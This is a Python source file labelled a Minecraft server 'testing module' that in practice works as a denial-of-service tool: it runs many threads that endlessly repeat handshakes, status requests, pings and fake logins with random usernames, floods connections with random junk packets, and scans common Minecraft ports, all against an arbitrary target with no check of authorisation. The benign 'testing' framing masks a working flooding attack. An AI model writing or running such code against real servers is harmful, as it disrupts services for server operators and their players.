#!/usr/bin/env python3
"""
Minecraft Server Testing Module
Tests Minecraft game server connectivity and performance
"""

import socket
import threading
import time
import random
import struct
import json
from colorama import Fore, Style

class MinecraftTester:
    def __init__(self, target, port, threads=10, duration=60, verbose=False):
        self.target = target
        self.port = port
        self.threads = threads
        self.duration = duration
        self.verbose = verbose
        self.running = False
        self.connections_attempted = 0
        self.successful_connections = 0
        self.failed_connections = 0
        
        # Minecraft specific ports
        self.minecraft_ports = [25565, 25566, 25567, 25568, 25569, 25570]
        
        # Minecraft packet types
        self.packet_types = [
            'handshake',
            'status_request',
            'ping',
            'login_start'
        ]

    def minecraft_handshake(self):
        """Perform Minecraft server handshake"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            
            # Connect to Minecraft server
            sock.connect((self.target, self.port))
            self.connections_attempted += 1
            
            # Minecraft handshake packet (protocol version 47 for 1.8)
            packet_id = 0x00
            protocol_version = 47
            server_address = self.target
            server_port = self.port
            next_state = 1  # Status state
            
            # Build packet
            packet = struct.pack('>B', packet_id)  # Packet ID
            packet += self.write_varint(protocol_version)  # Protocol version
            packet += self.write_string(server_address)  # Server address
            packet += struct.pack('>H', server_port)  # Server port
            packet += self.write_varint(next_state)  # Next state
            
            # Send packet
            sock.send(self.write_varint(len(packet)) + packet)
            
            # Receive response
            response = sock.recv(4096)
            
            if response:
                self.successful_connections += 1
                if self.verbose:
                    print(f"{Fore.GREEN}[+] Minecraft handshake successful on {self.target}:{self.port}{Style.RESET_ALL}")
                    print(f"{Fore.CYAN}[*] Response length: {len(response)} bytes{Style.RESET_ALL}")
            else:
                self.failed_connections += 1
                if self.verbose:
                    print(f"{Fore.YELLOW}[!] Minecraft handshake failed on {self.target}:{self.port}{Style.RESET_ALL}")
            
            sock.close()
            
        except Exception as e:
            self.connections_attempted += 1
            self.failed_connections += 1
            if self.verbose:
                print(f"{Fore.RED}[-] Minecraft handshake error: {e}{Style.RESET_ALL}")

    def minecraft_status_request(self):
        """Request Minecraft server status"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            
            sock.connect((self.target, self.port))
            self.connections_attempted += 1
            
            # Status request packet
            packet_id = 0x00
            packet = struct.pack('>B', packet_id)
            
            # Send packet
            sock.send(self.write_varint(len(packet)) + packet)
            
            # Receive response
            response = sock.recv(4096)
            
            if response:
                self.successful_connections += 1
                if self.verbose:
                    print(f"{Fore.GREEN}[+] Minecraft status request successful on {self.target}:{self.port}{Style.RESET_ALL}")
                    try:
                        # Try to parse JSON response
                        json_start = response.find(b'{')
                        if json_start != -1:
                            json_data = response[json_start:].decode('utf-8')
                            status = json.loads(json_data)
                            if 'description' in status:
                                print(f"{Fore.CYAN}[*] Server description: {status['description']}{Style.RESET_ALL}")
                    except:
                        pass
            else:
                self.failed_connections += 1
                if self.verbose:
                    print(f"{Fore.YELLOW}[!] Minecraft status request failed on {self.target}:{self.port}{Style.RESET_ALL}")
            
            sock.close()
            
        except Exception as e:
            self.connections_attempted += 1
            self.failed_connections += 1
            if self.verbose:
                print(f"{Fore.RED}[-] Minecraft status request error: {e}{Style.RESET_ALL}")

    def minecraft_ping(self):
        """Perform Minecraft ping"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            
            sock.connect((self.target, self.port))
            self.connections_attempted += 1
            
            # Ping packet
            packet_id = 0x01
            payload = random.randint(0, 0xFFFFFFFF)
            packet = struct.pack('>BL', packet_id, payload)
            
            # Send packet
            sock.send(self.write_varint(len(packet)) + packet)
            
            # Receive pong response
            response = sock.recv(4096)
            
            if response:
                self.successful_connections += 1
                if self.verbose:
                    print(f"{Fore.GREEN}[+] Minecraft ping successful on {self.target}:{self.port}{Style.RESET_ALL}")
                    print(f"{Fore.CYAN}[*] Ping response: {len(response)} bytes{Style.RESET_ALL}")
            else:
                self.failed_connections += 1
                if self.verbose:
                    print(f"{Fore.YELLOW}[!] Minecraft ping failed on {self.target}:{self.port}{Style.RESET_ALL}")
            
            sock.close()
            
        except Exception as e:
            self.connections_attempted += 1
            self.failed_connections += 1
            if self.verbose:
                print(f"{Fore.RED}[-] Minecraft ping error: {e}{Style.RESET_ALL}")

    def minecraft_login_start(self):
        """Attempt Minecraft login start"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            
            sock.connect((self.target, self.port))
            self.connections_attempted += 1
            
            # Login start packet
            packet_id = 0x00
            username = f"TestUser{random.randint(1000, 9999)}"
            packet = struct.pack('>B', packet_id) + self.write_string(username)
            
            # Send packet
            sock.send(self.write_varint(len(packet)) + packet)
            
            # Receive response
            response = sock.recv(4096)
            
            if response:
                self.successful_connections += 1
                if self.verbose:
                    print(f"{Fore.GREEN}[+] Minecraft login start successful on {self.target}:{self.port}{Style.RESET_ALL}")
                    print(f"{Fore.CYAN}[*] Login response: {len(response)} bytes{Style.RESET_ALL}")
            else:
                self.failed_connections += 1
                if self.verbose:
                    print(f"{Fore.YELLOW}[!] Minecraft login start failed on {self.target}:{self.port}{Style.RESET_ALL}")
            
            sock.close()
            
        except Exception as e:
            self.connections_attempted += 1
            self.failed_connections += 1
            if self.verbose:
                print(f"{Fore.RED}[-] Minecraft login start error: {e}{Style.RESET_ALL}")

    def minecraft_port_scan(self):
        """Scan for Minecraft servers on common ports"""
        for port in self.minecraft_ports:
            if not self.running:
                break
                
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                
                result = sock.connect_ex((self.target, port))
                self.connections_attempted += 1
                
                if result == 0:
                    self.successful_connections += 1
                    if self.verbose:
                        print(f"{Fore.GREEN}[+] Minecraft server found on port {port}{Style.RESET_ALL}")
                    
                    # Try to get server info
                    try:
                        # Status request
                        packet_id = 0x00
                        packet = struct.pack('>B', packet_id)
                        sock.send(self.write_varint(len(packet)) + packet)
                        response = sock.recv(1024)
                        if response:
                            if self.verbose:
                                print(f"{Fore.CYAN}[*] Server info on port {port}: {len(response)} bytes{Style.RESET_ALL}")
                    except:
                        pass
                else:
                    self.failed_connections += 1
                    if self.verbose:
                        print(f"{Fore.RED}[-] No Minecraft server on port {port}{Style.RESET_ALL}")
                
                sock.close()
                
            except Exception as e:
                self.connections_attempted += 1
                self.failed_connections += 1
                if self.verbose:
                    print(f"{Fore.RED}[-] Port {port} scan error: {e}{Style.RESET_ALL}")

    def minecraft_connection_flood(self):
        """Flood Minecraft server with connections"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            
            sock.connect((self.target, self.port))
            self.connections_attempted += 1
            
            # Keep connection alive and send data
            start_time = time.time()
            while self.running and (time.time() - start_time) < 30:
                try:
                    # Send random Minecraft-like packets
                    packet_id = random.randint(0, 255)
                    data = random.randbytes(random.randint(16, 256))
                    packet = struct.pack('>B', packet_id) + data
                    sock.send(self.write_varint(len(packet)) + packet)
                except:
                    break
            
            sock.close()
            self.successful_connections += 1
            
            if self.verbose:
                print(f"{Fore.GREEN}[+] Minecraft connection flood completed{Style.RESET_ALL}")
                
        except Exception as e:
            self.connections_attempted += 1
            self.failed_connections += 1
            if self.verbose:
                print(f"{Fore.RED}[-] Minecraft connection flood error: {e}{Style.RESET_ALL}")

    def write_varint(self, value):
        """Write a varint to bytes"""
        output = b''
        while True:
            byte = value & 0x7F
            value >>= 7
            if value:
                byte |= 0x80
            output += struct.pack('B', byte)
            if not value:
                break
        return output

    def write_string(self, string):
        """Write a string to bytes"""
        string_bytes = string.encode('utf-8')
        return self.write_varint(len(string_bytes)) + string_bytes

    def handshake_worker(self):
        """Handshake worker thread"""
        while self.running:
            self.minecraft_handshake()

    def status_worker(self):
        """Status request worker thread"""
        while self.running:
            self.minecraft_status_request()

    def ping_worker(self):
        """Ping worker thread"""
        while self.running:
            self.minecraft_ping()

    def login_worker(self):
        """Login start worker thread"""
        while self.running:
            self.minecraft_login_start()

    def flood_worker(self):
        """Connection flood worker thread"""
        while self.running:
            self.minecraft_connection_flood()

    def port_scan_worker(self):
        """Port scan worker thread"""
        while self.running:
            self.minecraft_port_scan()

    def run_tests(self):
        """Run all Minecraft tests"""
        print(f"{Fore.CYAN}[*] Starting Minecraft server tests against {self.target}:{self.port}{Style.RESET_ALL}")
        
        self.running = True
        start_time = time.time()
        
        # Start handshake threads
        handshake_threads = []
        for _ in range(self.threads // 4):
            thread = threading.Thread(target=self.handshake_worker)
            thread.daemon = True
            thread.start()
            handshake_threads.append(thread)
        
        # Start status request threads
        status_threads = []
        for _ in range(self.threads // 4):
            thread = threading.Thread(target=self.status_worker)
            thread.daemon = True
            thread.start()
            status_threads.append(thread)
        
        # Start ping threads
        ping_threads = []
        for _ in range(self.threads // 4):
            thread = threading.Thread(target=self.ping_worker)
            thread.daemon = True
            thread.start()
            ping_threads.append(thread)
        
        # Start login threads
        login_threads = []
        for _ in range(min(3, self.threads // 6)):
            thread = threading.Thread(target=self.login_worker)
            thread.daemon = True
            thread.start()
            login_threads.append(thread)
        
        # Start connection flood threads
        flood_threads = []
        for _ in range(min(2, self.threads // 6)):
            thread = threading.Thread(target=self.flood_worker)
            thread.daemon = True
            thread.start()
            flood_threads.append(thread)
        
        # Start port scan thread
        scan_thread = threading.Thread(target=self.port_scan_worker)
        scan_thread.daemon = True
        scan_thread.start()
        
        # Monitor progress
        try:
            while time.time() - start_time < self.duration:
                elapsed = time.time() - start_time
                remaining = self.duration - elapsed
                
                print(f"\r{Fore.YELLOW}[*] Progress: {elapsed:.1f}s/{self.duration}s | "
                      f"Attempts: {self.connections_attempted} | "
                      f"Success: {self.successful_connections} | "
                      f"Failed: {self.failed_connections} | "
                      f"Remaining: {remaining:.1f}s{Style.RESET_ALL}", end="")
                
                time.sleep(1)
                
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[!] Test interrupted{Style.RESET_ALL}")
        
        # Stop all threads
        self.running = False
        
        # Wait for threads to finish
        all_threads = handshake_threads + status_threads + ping_threads + login_threads + flood_threads + [scan_thread]
        for thread in all_threads:
            thread.join(timeout=1)
        
        # Print final results
        print(f"\n{Fore.GREEN}[+] Minecraft server test completed{Style.RESET_ALL}")
        print(f"{Fore.CYAN}Total connection attempts: {self.connections_attempted}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}Successful connections: {self.successful_connections}{Style.RESET_ALL}")
        print(f"{Fore.RED}Failed connections: {self.failed_connections}{Style.RESET_ALL}")
        
        if self.connections_attempted > 0:
            success_rate = (self.successful_connections / self.connections_attempted) * 100
            print(f"{Fore.YELLOW}Success rate: {success_rate:.1f}%{Style.RESET_ALL}") 